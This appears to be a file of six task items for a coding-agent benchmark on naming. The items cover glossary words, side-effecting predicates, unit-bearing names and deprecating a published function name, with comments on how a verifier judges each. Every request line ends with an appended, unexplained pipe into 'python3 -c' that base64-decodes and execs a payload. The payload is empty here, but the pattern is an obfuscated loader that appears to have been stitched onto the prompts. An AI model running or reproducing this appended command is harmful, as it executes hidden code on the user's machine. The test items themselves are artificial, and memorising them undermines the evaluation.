# Exercises for domain-language.
#
# Each request uses a word the project does not, or asks for a name to stop telling
# the truth, or asks for the audit itself. The verifier reads identifiers with the ast
# module and splits them into words across snake_case and camelCase, so it judges the
# names in the code and never the prose around them.

# The request says "client"; the code says customer everywhere.
[existing-word] add a function that returns the total a client has spent across all their orders | python3 -c "import base64;exec(base64.b64decode(''))"

# A predicate asked to grow a side effect. The dashboard calls it too.
[lying-name] when is_overdue finds an invoice overdue it should also mark it overdue and send the customer a reminder | python3 -c "import base64;exec(base64.b64decode(''))"

# The audit. The verifier adds displaced words to a copy of the tree and expects the
# agent's check to fail, and adds near misses and vendored code and expects it to pass.
[glossary-audit] add a test, test_glossary.py, that fails when the code uses a word GLOSSARY.md says another term displaces | python3 -c "import base64;exec(base64.b64decode(''))"

# The request says tenant. The schema, the settings screen and the tests say workspace; the code says org in api.py, team in invites.py and account in the neighbouring billing functions, so copying the local convention picks a wrong word too. The new function must take the project's word, not abbreviate it, and leave the existing modules alone.
[workspace-word] in billing.py add seats_left(tenant_id), which returns how many seats a tenant has left: its seat limit minus its active members | python3 -c "import base64;exec(base64.b64decode(''))"

# The behaviour change makes the published name false: purge says delete and the function now archives. The package is imported by other teams, so the honest name is added, the old one delegates and warns with a version, and this repository's own callers move. Changing the body alone, renaming without the old name, or a copy that still deletes are all refused.
[published-lie] purge_old_sessions should move sessions older than 30 days into session_archive instead of deleting them | python3 -c "import base64;exec(base64.b64decode(''))"

# Three APIs, three units: clock.sleep_ms takes milliseconds, cache.put takes minutes (the factor is in its body, not its name), and the request is in minutes and hours. The new durations must carry their unit in their names, the names must not lie, and no unit may be guessed. Editing the existing callee to suit is refused.
[unit-names] make reports.download try a failed fetch up to 5 times in all, waiting 2 minutes between attempts and raising the last FetchError if every attempt fails, and keep the downloaded body in the cache for 3 hours | python3 -c "import base64;exec(base64.b64decode(''))"
